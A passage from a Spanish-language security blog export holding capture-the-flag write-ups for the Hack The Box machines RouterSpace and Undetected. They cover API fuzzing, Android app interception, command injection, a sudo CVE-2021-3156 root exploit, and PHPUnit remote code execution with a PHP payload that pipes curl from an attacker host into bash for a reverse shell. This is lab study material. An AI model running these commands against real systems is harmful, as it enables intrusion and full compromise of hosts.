\u0026#39;4584186MTHGwP\u0026#39;, \u0026#39;connet\\x20to\\x20\u0026#39;, \u0026#39;vESlr\u0026#39;, \u0026#39;GHjuW\u0026#39;, \u0026#39;\\x20Address.\u0026#39;, \u0026#39;container\u0026#39;, \u0026#39;create\u0026#39;, \u0026#39;RouterSpac\u0026#39;, \u0026#39;viceAccess\u0026#39;, \u0026#39;72dIvHGU\u0026#39;, \u0026#39;info\u0026#39;]; Si intentamos buscar la ruta de la API completa no es posible, ya que la API detecta como actividad sospechosa cada una de las solicitudes y retorna un numero aleatorio de caracteres y espacios en blanco, por lo que es casi imposible realizar algun tipo de filtro (tamaño, palabras, lineas) ya sea con feroxbuster o ffuf.\nferoxbuster\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 π ~/htb/routerspace ❯ feroxbuster -u http://routerspace.htb/api/v4/ -w $CM ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://routerspace.htb/api/v4/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirb/common.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── WLD 5l 12w 71c Got 200 for http://routerspace.htb/api/v4/0b4efbf6fd57496ba7ece4b21523e74a (url length: 32) WLD 5l 13w 79c Got 200 for http://routerspace.htb/api/v4/9c99d7fc34f648f78ff70bdaecc7b8345a3c6f69d0b9468dabcb3586295d3f4c6c7c4ea5135f458f8f5853b795b41ff0 (url length: 96) 200 7l 14w 79c http://routerspace.htb/api/v4/.config 200 1l 10w 64c http://routerspace.htb/api/v4/_files 200 7l 10w 70c http://routerspace.htb/api/v4/.bash_history 200 5l 15w 78c http://routerspace.htb/api/v4/.forward 200 1l 14w 72c http://routerspace.htb/api/v4/.hta 200 1l 12w 66c http://routerspace.htb/api/v4/.cvs 200 6l 11w 72c http://routerspace.htb/api/v4/.history 200 7l 12w 75c http://routerspace.htb/api/v4/.git/HEAD 200 2l 12w 66c http://routerspace.htb/api/v4/.htpasswd 200 1l 12w 75c http://routerspace.htb/api/v4/.bashrc 200 3l 12w 68c http://routerspace.htb/api/v4/.listing 200 1l 11w 62c http://routerspace.htb/api/v4/.cvsignore 200 1l 11w 76c http://routerspace.htb/api/v4/.listings 200 6l 11w 70c http://routerspace.htb/api/v4/.htaccess 200 5l 13w 79c http://routerspace.htb/api/v4/.cache 200 3l 15w 76c http://routerspace.htb/api/v4/.ssh 200 3l 13w 73c http://routerspace.htb/api/v4/_archive 200 1l 12w 70c http://routerspace.htb/api/v4/_assets 200 5l 10w 71c http://routerspace.htb/api/v4/.mysql_history 200 6l 13w 75c http://routerspace.htb/api/v4/.sh_history 200 4l 12w 72c http://routerspace.htb/api/v4/.svn 200 5l 12w 76c http://routerspace.htb/api/v4/_backup 200 2l 12w 76c http://routerspace.htb/api/v4/.rhosts 200 1l 11w 70c http://routerspace.htb/api/v4/.subversion 200 2l 13w 70c http://routerspace.htb/api/v4/_borders 200 1l 14w 72c http://routerspace.htb/api/v4/.svn/entries 200 5l 13w 84c http://routerspace.htb/api/v4/_baks 200 2l 14w 74c http://routerspace.htb/api/v4/_cache 200 7l 11w 73c http://routerspace.htb/api/v4/_adm 200 6l 12w 73c http://routerspace.htb/api/v4/_catalogs 200 6l 14w 75c http://routerspace.htb/api/v4/.swf 200 3l 14w 74c http://routerspace.htb/api/v4/.web 200 4l 12w 71c http://routerspace.htb/api/v4/_code 200 2l 10w 64c http://routerspace.htb/api/v4/_admin 200 3l 13w 74c http://routerspace.htb/api/v4/@ 200 1l 13w 74c http://routerspace.htb/api/v4/_ 200 5l 10w 71c http://routerspace.htb/api/v4/.perf 200 4l 13w 78c http://routerspace.htb/api/v4/_ajax 200 3l 13w 76c http://routerspace.htb/api/v4/.profile 200 1l 11w 67c http://routerspace.htb/api/v4/_common 200 5l 11w 67c http://routerspace.htb/api/v4/.passwd 200 1l 14w 77c http://routerspace.htb/api/v4/_conf 200 1l 11w 66c http://routerspace.htb/api/v4/_db_backups 200 7l 11w 68c http://routerspace.htb/api/v4/_data 200 4l 12w 76c http://routerspace.htb/api/v4/_database 200 1l 11w 70c http://routerspace.htb/api/v4/_css 200 4l 12w 73c http://routerspace.htb/api/v4/_dummy 200 1l 10w 66c http://routerspace.htb/api/v4/_derived ^C 1 2 3 4 5 6 7 8 9 10 11 π ~/htb/routerspace ❯ curl -s http://routerspace.htb/api/v4/users Suspicious activity detected !!! {RequestID: G W Xq K hIub v } π ~/htb/routerspace ❯ curl -s http://routerspace.htb/api/v4/users Suspicious activity detected !!! {RequestID: tc2 5 N3 nu g oK N 8wH } π ~/htb/routerspace ❯ React Decompiler El comando react-native-decompiler nos muestra multiples archivos extraidos del fichero index.android.bundle, aunque no muestra el codigo entendible.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 # npm install react-native-decompiler # npx react-native-decompiler -i index.android.bundle -o output_routerspacebundle/ ➜ assets ls output_routerspacebundle/ 0.js 146.js 179.js 210.js 239.js 267.js 30.js 412.js 438.js 464.js 490.js 516.js 543.js 579.js 605.js 633.js 661.js 689.js 716.js 10.js 147.js 17.js 211.js 240.js 268.js 311.jsx 413.js 439.js 465.js 491.js 517.js 544.js 57.js 606.js 634.js 662.js 690.js 717.js 11.js 148.js 180.js 212.js 241.js 269.js 312.js 414.js 43.js 466.js 492.js 518.js 545.js 580.js 607.js 635.js 663.js 691.js 718.js 123.js 149.js 183.js 215.js 242.js 270.js 31.js 415.jsx 440.js 467.js 493.jsx 519.js 546.js 581.js 608.js 636.js 664.js 692.js 719.js 124.js 14.js 184.js 216.js 243.js 271.js 32.js 416.js 441.js 468.js 494.jsx 51.js 547.js 582.js 609.js 637.js 665.js 693.js 720.js 125.js 150.js 185.js 217.js 244.js 272.js 33.js 417.js 442.js 469.js 495.js 520.jsx 548.js 583.js 610.js 638.js 666.js 694.js 721.js 126.js 151.js 188.jsx 218.js 245.js 273.js 34.js 418.js 443.js 46.js 496.jsx 521.jsx 549.js 584.js 611.js 639.js 667.js 695.js 722.js 127.js 152.js 189.js 219.js 246.jsx 274.js 35.js 419.js 444.js 470.js 497.js 522.js 54.js 585.js 612.js 640.js 668.js 696.js 723.js 128.js 153.js 18.js 220.js 247.js 275.js 36.js 41.js 445.js 471.js 498.js 523.jsx 550.js 586.js 613.js 641.js 669.js 697.js 724.js 129.js 154.js 190.js 221.js 248.js 276.js 37.js 420.js 446.js 472.js 499.jsx 525.js 551.js 587.js 614.js 642.js 670.js 698.js 725.js 12.js 155.js 191.js 222.js 249.jsx 277.js 38.js 421.js 447.js 473.js 49.js 526.js 552.js 588.js 615.js 643.js 671.js 699.js 726.js 130.js 156.js 195.js 223.js 250.jsx 278.js 397.js 422.js 448.js 474.js 4.js 527.js 55.js 589.js 616.js 644.js 672.js 6.js 727.js 131.js 157.js 196.js 224.js 251.js 279.js 398.js 423.js 449.js 475.js 500.js 528.js 562.js 58.js 617.js 645.js 673.js 700.js 728.js 132.js 158.js 197.js 225.js 252.js 280.js 399.js 424.js 44.js 476.js 501.jsx 529.js 563.js 590.js 618.js 646.js 674.js 701.js 729.js 133.js 159.js 198.js 226.js 253.jsx 281.js 39.js 425.js 450.js 477.js 502.js 52.js 564.js 591.js 619.js 647.js 675.js 702.js 730.js 134.js 15.js 199.js 227.js 254.jsx 282.js 3.js 426.js 451.js 478.js 503.js 530.js 565.js 592.js 620.js 648.js 676.js 703.js 731.js 135.js 160.js 19.js 228.js 255.js 283.js 400.jsx 427.js 453.js 479.js 504.js 531.jsx 566.js 593.js 621.js 649.js 677.js 704.js 77.js 136.js 161.js 200.js 229.js 256.js 284.js 401.js 428.js 454.js 47.js 505.js 532.js 567.js 594.js 622.js 650.js 678.js 705.js 78.js 137.js 162.js 201.js 22.js 257.jsx 285.js 402.js 429.js 455.js 480.js 506.js 533.js 568.js 595.js 623.js 651.js 679.js 706.js 7.js 138.js 166.js 202.js 230.js 258.js 286.js 403.js 42.js 456.jsx 481.js 507.js 534.jsx 569.js 596.js 624.js 652.js 680.js 707.js 86.js 139.js 167.js 203.js 231.js 259.js 287.js 404.js 430.js 457.js 482.js 508.js 535.js 56.js 597.js 625.js 653.js 681.js 708.js 88.js 13.js 168.js 204.js 232.js 260.jsx 288.jsx 405.js 431.js 458.js 483.js 509.js 536.js 571.jsx 598.js 626.js 654.js 682.js 709.js 8.js 140.js 169.js 205.js 233.js 261.jsx 289.jsx 406.js 432.js 459.js 484.js 50.js 537.js 572.js 599.js 627.js 655.js 683.js 710.js 9.js 141.js 16.js 206.js 234.js 262.js 28.js 407.js 433.js 45.js 485.js 510.js 538.js 573.js 600.js 628.js 656.js 684.js 711.js null.cache 142.js 170.js 207.js 235.js 263.js 290.jsx 408.js 434.js 460.js 486.js 511.js 539.js 574.js 601.js 629.js 657.js 685.js 712.js 143.js 171.js 208.js 236.js 264.js 291.jsx 409.js 435.js 461.js 487.js 512.jsx 53.js 575.js 602.js 630.js 658.js 686.js 713.js 144.js 177.js 209.js 237.js 265.js 292.js 40.js 436.js 462.js 488.js 513.jsx 540.js 577.js 603.js 631.js 659.js 687.js 714.js 145.js 178.js 20.js 238.js 266.js 293.js 410.js 437.js 463.js 48.js 514.js 542.js 578.js 604.js 632.js 660.js 688.js 715.js ➜ assets Analisis Dinamico Burpsuite Configuramos burpsuite para capturar todo el trafico de la aplicación, en este caso la dirección de la interfaz vmnet8 o en el caso de dar algun problema de conexión en All interfaces.\nDescargamos el certificado de burpsuite en la dirección y puerto a la escucha.\nGenymotion Descargamos el emulador Genymotion, y realizamos la instalación de este.\n1 2 chmod +x genymotion-3.2.1-linux_x64.bin ./genymotion-3.2.1-linux_x64.bin Iniciamos el emulador ejecutando el fichero genymotion en la carpeta de instalación o bien directamente desde el icono de ejecución.\n1 2 3 4 5 ➜ genymotion ls completion libEGL_translator.so libGLES_V2_translator.so.1.0.0 libQt5Location.so.5 libQt5XcbQpa.so.5 plugins [.. snip ..] libdbus-1.so.3 libGLES_V2_translator.so.1.0 libQt5Gui.so.5 libQt5Widgets.so.5 player ➜ genymotion ./genymotion Tras registrar e ingresar con una cuenta, creamos un dispositivo. Utilizamos la versión 6 de Android (basado en certificate_unknown), como dispositivo el Google Nexus 5.\nEn la siguiente pantalla nos pide el Network Mode, en esta opción elegimos el adaptador al cual conectar nuestro dispositivo, en este caso el adaptador de VMWare al cual la máquina Kali está conectada y donde Burpsuite está a la escucha, en mi caso vmnet8.\nElegimos vmnet8 y damos a Install para crear el dispositivo virtual.\nAl finalizar se mostrará un mensaje de instalación y el dispositivo listo.\nIniciamos el dispositivo con clic derecho \u0026gt; Start.\nADB Genymotion en su carpeta de instalación contiene la herramienta adb la cual vamos a utilizar para comunicarnos con el dispositivo.\n1 2 3 ➜ genymotion ls tools/ aapt adb glewinfo lib64 ➜ genymotion Certificado Incialmente creamos la variable $adb con la dirección completa de adb, vemos que podemos listar los dispositivos, el nuestro en la lista.\n1 2 3 4 5 6 7 8 ➜ htb_routerspace export adb=$HOME/Downloads/genymotion/tools/adb ➜ htb_routerspace $adb devices List of devices attached 192.168.56.104:5555 device ➜ htb_routerspace ls cacert.der RouterSpace.apk ➜ htb_routerspace Para instalar el certificado cambiamos la extensión de este a .cer, y movemos el certificado a la carpeta sdcard/. Luego de ello creamos un PIN o Patron de bloqueo para el dispositivo.\n1 2 3 4 ➜ htb_routerspace mv cacert.der cacert.cer ➜ htb_routerspace $adb push cacert.cer sdcard/ cacert.cer: 1 file pushed. 0.1 MB/s (939 bytes in 0.013s) ➜ htb_routerspace Finalmente en Configuraciones nos vamos a Security \u0026gt; Install from sdcard \u0026gt; Google Nexus 5 elegimos el certificado a instalar: cacert.cer, le damos un nombre, nos pedira ingresar el PIN o Patron de bloqueo.\nObservamos en Trusted Credentials el certificado de Burpsuite.\nProxy Finalmente configuramos el proxy en la configuración de Wifi.\nUna alternativa para configurar el proxy utilizando adb.\n1 2 3 4 5 #Enable proxy $adb shell settings put global http_proxy 192.168.22.129:8080 #Disable proxy $adb shell settings put global http_proxy :0 Tras configurar el Proxy vemos que podemos navegar por internet y capturar las peticiones con burpsuite.\nRouterSpace Instalamos la aplicación ejecutando $adb install RouterSpace.apk, vemos que la instalación fué exitosa.\nLa aplicación luego de la presentación muestra unicamente un boton.\nTras presionar el boton vemos que realiza una petición POST tipo json, con el atributo \u0026quot;ip\u0026quot; y la dirección \u0026quot;0.0.0.0\u0026quot; a la ruta de la API del dominio routerspace.htb, aunque no hay alguna respuesta ya que dicho dominio no está en el archivo /etc/hosts.\nCommand Injection Tras agregar el dominio, vemos que la respuesta de la solicitud muestra la dirección \u0026quot;0.0.0.0\u0026quot;.\nManipulando un poco la solicitud descubrimos que es posible inyectar comandos y vemos el resultado en la respuesta de la solicitud, en este caso id nos muestra el usuario y grupo paul.\nUser - Paul Shell Generamos una clave publica con ssh-keygen y la agregamos al archivo authorized_keys en /home/paul/.ssh.\nIngresamos por SSH logrando obtener una shell y la flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 π ~/htb/routerspace ❯ ssh paul@routerspace.htb Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-90-generic x86_64) [.. snip ..] paul@routerspace:~$ whoami;id;pwd paul uid=1001(paul) gid=1001(paul) groups=1001(paul) /home/paul paul@routerspace:~$ ls snap user.txt paul@routerspace:~$ cat user.txt e796682e4394c54a68c1f793b98dfe78 paul@routerspace:~$ Privesc Enumerando los ficheros suid vemos en la lista a sudo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 paul@routerspace:~$ find / -perm -4000 2\u0026gt;/dev/null | xargs ls -lah -rwsr-sr-x 1 daemon daemon 55K Nov 12 2018 /usr/bin/at -rwsr-xr-x 1 root root 84K Jul 14 2021 /usr/bin/chfn -rwsr-xr-x 1 root root 52K Jul 14 2021 /usr/bin/chsh -rwsr-xr-x 1 root root 39K Mar 7 2020 /usr/bin/fusermount -rwsr-xr-x 1 root root 87K Jul 14 2021 /usr/bin/gpasswd -rwsr-xr-x 1 root root 55K Jul 21 2020 /usr/bin/mount -rwsr-xr-x 1 root root 44K Jul 14 2021 /usr/bin/newgrp -rwsr-xr-x 1 root root 67K Jul 14 2021 /usr/bin/passwd -rwsr-xr-x 1 root root 67K Jul 21 2020 /usr/bin/su -rwsr-xr-x 1 root root 163K Feb 3 2020 /usr/bin/sudo -rwsr-xr-x 1 root root 39K Jul 21 2020 /usr/bin/umount -rwsr-xr-- 1 root messagebus 51K Jun 11 2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper -rwsr-xr-x 1 root root 15K Jul 8 2019 /usr/lib/eject/dmcrypt-get-device -rwsr-xr-x 1 root root 463K Jul 23 2021 /usr/lib/openssh/ssh-keysign -rwsr-xr-x 1 root root 23K May 26 2021 /usr/lib/policykit-1/polkit-agent-helper-1 paul@routerspace:~$ Tras verificar la version, observamos que es 1.8.31, vulnerable a CVE-2021-3156.\n1 2 3 4 5 6 paul@routerspace:~$ /usr/bin/sudo --version Sudo version 1.8.31 Sudoers policy plugin version 1.8.31 Sudoers file grammar version 46 Sudoers I/O plugin version 1.8.31 paul@routerspace:~$ Creamos los archivos necesarios para el CVE-2021-3156.\n1 2 3 paul@routerspace:/dev/shm$ ls exploit.c Makefile shellcode.c paul@routerspace:/dev/shm$ Ejecutamos make y finalmente exploit, lo que nos dio una shell como root y la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 paul@routerspace:/dev/shm$ make mkdir libnss_x cc -O3 -shared -nostdlib -o libnss_x/x.so.2 shellcode.c cc -O3 -o exploit exploit.c paul@routerspace:/dev/shm$ ./exploit # whoami;id root uid=0(root) gid=0(root) groups=0(root),1001(paul) # cd /root # ls root.txt # cat root.txt e92e7e0e246b58e5cd99e00af92858c1 # ","description":"RouterSpace presenta una aplicación android la cual nos permitió descubrir una vulnerabilidad Command Injection en la API utilizada por esta lo que nos dio acceso a la máquina. Escalamos privilegios tras identificar la version de sudo y el CVE-2021-3156.","id":22,"section":"posts","tags":["android","apktool","jadx","react","react-decompiler","adb","genymotion","command injection","sudo","CVE-2021-3156"],"title":"Hack The Box - RouterSpace","uri":"https://sckull.github.io/posts/routerspace/"},{"content":"\rTras descubrir una vulnerabilidad RCE en PHPUnit logramos obtener acceso a al máquina. Distintos archivos que indicaban una \u0026quot;intrución\u0026quot; y \u0026quot;persistencia\u0026quot; en la máquina nos llevaron a un segundo usuario. Finalmente tras analizar distintos ficheros de Apache obtuvimos acceso privilegiado.\nNombre Undetected OS Linux Puntos 30 Dificultad Media IP 10.10.11.146 Maker TheCyberGeek\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[6.7, 4.6, 4.7, 5.3, 5.4],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: http (80) y ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # Nmap 7.91 scan initiated Sat Feb 19 23:30:18 2022 as: nmap -p22,80 -sV -sC -oN nmap_scan 10.129.138.191 Nmap scan report for 10.10.11.146 (10.10.11.146) Host is up (0.074s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2 (protocol 2.0) | ssh-hostkey: | 3072 be:66:06:dd:20:77:ef:98:7f:6e:73:4a:98:a5:d8:f0 (RSA) | 256 1f:a2:09:72:70:68:f4:58:ed:1f:6c:49:7d:e2:13:39 (ECDSA) |_ 256 70:15:39:94:c2:cd:64:cb:b2:3b:d1:3e:f6:09:44:e8 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Diana\u0026#39;s Jewelry Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Feb 19 23:30:31 2022 -- 1 IP address (1 host up) scanned in 12.44 seconds Web Site Realizando una solicitud con curl no vemos algun tipo de redirección o dominio.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/undetected ❯ curl -sI 10.10.11.146 HTTP/1.1 200 OK Date: Sat, 19 Feb 2022 23:30:36 GMT Server: Apache/2.4.41 (Ubuntu) Last-Modified: Tue, 06 Jul 2021 20:04:55 GMT ETag: \u0026#34;3bb3-5c679ef832085\u0026#34; Accept-Ranges: bytes Content-Length: 15283 Vary: Accept-Encoding Content-Type: text/html El sitio web parece ser una tienda de Joyas, y se muestra información de esta.\nExpand me - Web Site\rVemos en los botones de la tienda un dominio y subdominio, los cuales agregamos al archivo /etc/hosts.\n1 2 3 4 5 6 7 8 \u0026lt;div class=\u0026#34;banner\u0026#34; id=\u0026#34;home\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container\u0026#34; style=\u0026#34;text-align:center;\u0026#34;\u0026gt; \u0026lt;h4 class=\u0026#34;os-animation\u0026#34; data-os-animation=\u0026#34;rotateInDownLeft\u0026#34; data-os-animation-delay=\u0026#34;0.3s\u0026#34;\u0026gt;We bring you\u0026lt;/h4\u0026gt; \u0026lt;h1 class=\u0026#34;os-animation\u0026#34; data-os-animation=\u0026#34;rotateInDownRight\u0026#34; data-os-animation-delay=\u0026#34;0.5s\u0026#34; style=\u0026#34;font-family: Novecentowide;\u0026#34;\u0026gt;DJEWELRY.HTB \u0026lt;br\u0026gt;Diana\u0026#39;s Jewelry\u0026lt;/h1\u0026gt; \u0026lt;a href=\u0026#34;#news\u0026#34; class=\u0026#34;whiteone os-animation\u0026#34; data-os-animation=\u0026#34;slideInLeft\u0026#34; data-os-animation-delay=\u0026#34;0.7s\u0026#34;\u0026gt;LEARN MORE\u0026lt;/a\u0026gt; \u0026lt;a href=\u0026#34;http://store.djewelry.htb\u0026#34; class=\u0026#34;whiteone os-animation\u0026#34; data-os-animation=\u0026#34;slideInRight\u0026#34; data-os-animation-delay=\u0026#34;0.7s\u0026#34;\u0026gt;VISIT STORE\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; Observamos una lista de productos en el subdominio.\nExpand me - Productos\rEl sitio web parece ser estático ya que el carrito de compras y otras opciones muestran un mensaje de \u0026ldquo;migración\u0026rdquo; del sitio.\nDirectory Brute Forcing feroxbuster no muestra más que los archivos de la plantilla del sitio web en el dominio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 π ~/htb/undetected ❯ feroxbuster -u http://djewelry.htb/ -w $MD -x php --depth 1 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://djewelry.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php] 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 301 9l 28w 317c http://djewelry.htb/images 301 9l 28w 316c http://djewelry.htb/icons 301 9l 28w 314c http://djewelry.htb/css 301 9l 28w 313c http://djewelry.htb/js 301 9l 28w 316c http://djewelry.htb/fonts En el subdominio vemos multiples archivos php, pero la mayoria no parece tener algun tipo de funcionalidad.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 π ~/htb/undetected ❯ feroxbuster -u http://store.djewelry.htb/ -w $MD -x php --depth 1 ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.3.3 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://store.djewelry.htb/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.3.3 💉 Config File │ /etc/feroxbuster/ferox-config.toml 💲 Extensions │ [php] 🔃 Recursion Depth │ 1 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 301 9l 28w 325c http://store.djewelry.htb/images 200 195l 475w 6215c http://store.djewelry.htb/index.php 200 229l 550w 7447c http://store.djewelry.htb/products.php 200 122l 337w 4129c http://store.djewelry.htb/login.php 200 134l 354w 4396c http://store.djewelry.htb/cart.php 301 9l 28w 322c http://store.djewelry.htb/css 301 9l 28w 321c http://store.djewelry.htb/js 301 9l 28w 325c http://store.djewelry.htb/vendor 301 9l 28w 324c http://store.djewelry.htb/fonts 403 9l 28w 283c http://store.djewelry.htb/server-status www-data - User PHPUnit RCE Enumerando las diferentes \u0026ldquo;dependencias\u0026rdquo; en vendor/ del subdominio encontramos phpunit, que tiene una vulnarabilidad que permite ejecutar comandos de forma remota, se muestra el CVE-2017-9841, encontramos esta vulnarbilidad en el archivo /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php, simplemente enviando codigo php este lo ejecutaría.\nVemos que al enviar codigo php este se ejecuta, observamos el resultado de phpinfo() en el render de Burpsuite.\nUtilizamos shells para ejecutar una shell inversa, enviando un comando que lo ejecute.\n1 2 \u0026lt;?php system(\u0026#34;curl 10.10.14.77/10.10.14.77:1336|bash\u0026#34;); Con netcat a la escucha logramos obtener una shell como www-data.\n1 2 3 4 5 6 7 8 9 10 11 12 13 ┌──(kali㉿kali)-[~/htb/undetected] └─$ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.14.77] from djewelry.htb [10.10.11.146] 39736 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ which python $ which python3 /usr/bin/python3 $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ whoami;id www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@production:/var/www/store/vendor/phpunit/phpunit/src/Util/PHP$ Steven - User Enumerando los usuarios en /etc/passwd vemos que existen dos usuarios con un nombre similar, aunque solo existe un directorio principal.\n1 2 3 4 5 www-data@production:/$ cat /etc/passwd|grep home syslog:x:104:110::/home/syslog:/usr/sbin/nologin steven:x:1000:1000:Steven Wright:/home/steven:/bin/bash steven1:x:1000:1000:,,,:/home/steven:/bin/bash www-data@production:/$ En la carpeta /var/backups encontramos un ejecutable que le pertenece a www-data.\n1 2 3 4 5 6 7 8 9 10 11 12 13 www-data@production:/var/backups$ ls -lah total 736K drwxr-xr-x 2 root root 4.0K Feb 23 06:38 . drwxr-xr-x 13 root root 4.0K Feb 8 19:59 .. -rw-r--r-- 1 root root 50K Feb 23 06:25 alternatives.tar.0 -rw-r--r-- 1 root root 34K Feb 8 19:05 apt.extended_states.0 -rw-r--r-- 1 root root 268 Jun 4 2021 dpkg.diversions.0 -rw-r--r-- 1 root root 172 Jul 4 2021 dpkg.statoverride.0 -rw-r--r-- 1 root root 602K Feb 8 19:06 dpkg.status.0 -r-x------ 1 www-data www-data 27K May 14 2021 info www-data@production:/var/backups$ file info info: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=0dc004db7476356e9ed477835e583c68f1d2493a, for GNU/Linux 3.2.0, not stripped www-data@production:/var/backups$ Utilizamos netcat para enviar el archivo localmente, al pasarle strings sobre el archivo vemos que parece ser un \u0026ldquo;exploit\u0026rdquo; para escalar privilegios, encontramos strings similares en el PoC de CVE-2017-7308, aunque no se muestra la string en hexadecimal.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 π ~/htb/undetected ❯ strings info_www /lib64/ld-linux-x86-64.so.2 [.. snip ..] sendto sleep __cxa_finalize memmem __libc_start_main write libc.so.6 GLIBC_2.3.4 GLIBC_2.4 GLIBC_2.2.5 _ITM_deregisterTMCloneTable __gmon_start__ _ITM_registerTMCloneTable u/UH []A\\A]A^A_ [-] setsockopt(PACKET_VERSION) [-] setsockopt(PACKET_RX_RING) [-] socket(AF_PACKET) [-] bind(AF_PACKET) [-] sendto(SOCK_RAW) [-] socket(SOCK_RAW) [-] socket(SOCK_DGRAM) [-] klogctl(SYSLOG_ACTION_SIZE_BUFFER) [-] klogctl(SYSLOG_ACTION_READ_ALL) Freeing SMP [-] substring \u0026#39;%s\u0026#39; not found in dmesg ffff /bin/bash 